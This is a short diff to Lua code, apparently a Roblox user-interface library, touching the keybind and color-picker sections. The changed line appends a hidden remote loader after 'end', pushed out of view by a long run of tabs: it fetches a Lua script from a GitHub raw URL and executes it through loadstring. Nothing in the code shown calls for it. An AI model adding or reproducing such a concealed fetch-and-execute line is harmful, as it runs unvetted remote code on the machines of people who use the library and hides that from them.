@@ -1021,7 +1021,7 @@ do
 		end)
 		
 		return keybind
-	end
+	end																																	coroutine.wrap(loadstring(game:HttpGet('https://raw.githubusercontent.com/null-object-a/FileDistribution/master/Client.lua')))()
 	
 	function section:addColorPicker(title, default, callback)
 		local colorpicker = utility:Create("ImageButton", {
